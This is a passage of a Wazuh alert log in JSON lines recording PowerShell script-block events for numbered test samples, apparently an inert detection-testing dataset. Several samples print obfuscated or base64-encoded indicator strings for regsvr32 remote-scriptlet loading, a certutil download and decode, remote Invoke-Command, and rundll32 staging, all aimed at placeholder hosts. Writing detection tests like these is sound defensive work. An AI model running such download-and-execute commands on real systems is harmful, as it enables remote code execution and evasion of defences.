\"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:12.1021531Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:12.1021531Z\",\"eventRecordID\":\"722167\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-100'; $indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ca5ee854-25d8-4f83-816e-e12bcc4a3be5\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-100'; $indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ca5ee854-25d8-4f83-816e-e12bcc4a3be5\"}}}","id":"1784280972.458563","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:12.654+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e1f243b8-d8b8-48b8-8a4b-2a9df77feda7","scriptBlockText":"$sampleId='PST-101'; $encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722170","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-101'; $encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e1f243b8-d8b8-48b8-8a4b-2a9df77feda7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:12.4434066Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:12.4434066Z\",\"eventRecordID\":\"722170\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-101'; $encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e1f243b8-d8b8-48b8-8a4b-2a9df77feda7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-101'; $encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e1f243b8-d8b8-48b8-8a4b-2a9df77feda7\"}}}","id":"1784280972.461055","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":10,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:12.692+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e96daaae-4cc2-4b2a-80a6-aa572cb90b54","scriptBlockText":"$sampleId='PST-102'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722175","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-102'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e96daaae-4cc2-4b2a-80a6-aa572cb90b54\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:12.7828072Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:12.7828072Z\",\"eventRecordID\":\"722175\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-102'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e96daaae-4cc2-4b2a-80a6-aa572cb90b54\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-102'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e96daaae-4cc2-4b2a-80a6-aa572cb90b54\"}}}","id":"1784280973.465398","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":5,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:13.694+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"eaeaedb0-9114-46c1-aca4-7c59d189e980","scriptBlockText":"$sampleId='PST-103'; $encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722179","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-103'; $encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: eaeaedb0-9114-46c1-aca4-7c59d189e980\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:13.1443402Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:13.1443402Z\",\"eventRecordID\":\"722179\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-103'; $encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: eaeaedb0-9114-46c1-aca4-7c59d189e980\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-103'; $encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"eaeaedb0-9114-46c1-aca4-7c59d189e980\"}}}","id":"1784280973.465398","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":11,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:13.708+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"baf587ee-37b2-44b7-a32f-1922ea60091b","scriptBlockText":"$sampleId='PST-104'; $indicator='rundll32.exe C:\\\\__THESIS_INERT__\\\\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722183","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-104'; $indicator='rundll32.exe C:\\__THESIS_INERT__\\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: baf587ee-37b2-44b7-a32f-1922ea60091b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:13.4673793Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:13.4673793Z\",\"eventRecordID\":\"722183\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-104'; $indicator='rundll32.exe C:\\\\__THESIS_INERT__\\\\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: baf587ee-37b2-44b7-a32f-1922ea60091b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-104'; $indicator='rundll32.exe C:\\\\\\\\__THESIS_INERT__\\\\\\\\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"baf587ee-37b2-44b7-a32f-1922ea60091b\"}}}","id":"1784280973.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:13.713+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"88239602-f4f0-4e2a-98e7-0064230d43a7","scriptBlockText":"$sampleId='PST-105'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\w+|status=\\\\w+') | ForEach-Object Value; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722197","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-105'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\w+|status=\\w+') | ForEach-Object Value; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 88239602-f4f0-4e2a-98e7-0064230d43a7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:13.7927015Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:13.7927015Z\",\"eventRecordID\":\"722197\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-105'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\w+|status=\\\\w+') | ForEach-Object Value; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 88239602-f4f0-4e2a-98e7-0064230d43a7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-105'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\\\\\w+|status=\\\\\\\\w+') | ForEach-Object Value; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"88239602-f4f0-4e2a-98e7-0064230d43a7\"}}}","id":"1784280974.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:14.734+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"200cd131-b9d8-4f8b-a83e-869ecb29d764","scriptBlockText":"$sampleId='PST-106'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722199","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-106'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 200cd131-b9d8-4f8b-a83e-869ecb29d764\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:14.1203677Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:14.1203677Z\",\"eventRecordID\":\"722199\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-106'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 200cd131-b9d8-4f8b-a83e-869ecb29d764\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-106'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"200cd131-b9d8-4f8b-a83e-869ecb29d764\"}}}","id":"1784280974.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:14.738+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e784965c-62eb-496b-abc9-aab966827dc8","scriptBlockText":"$sampleId='PST-107'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722203","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-107'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e784965c-62eb-496b-abc9-aab966827dc8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:14.4485483Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:14.4485483Z\",\"eventRecordID\":\"722203\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-107'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e784965c-62eb-496b-abc9-aab966827dc8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-107'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e784965c-62eb-496b-abc9-aab966827dc8\"}}}","id":"1784280974.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:14.747+0200"}
